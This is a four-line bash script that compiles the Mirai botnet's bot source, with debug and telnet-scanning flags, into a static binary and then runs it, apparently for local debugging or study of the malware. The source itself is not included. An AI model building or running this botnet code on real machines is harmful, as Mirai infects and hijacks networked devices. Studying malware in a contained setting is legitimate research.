#!/bin/bash

cd ~/src/mirai
gcc -std=c99 -DDEBUG -DMIRAI_TELNET bot/*.c -static -fcommon -g -o debug/mirai.dbg
./debug/mirai.dbg
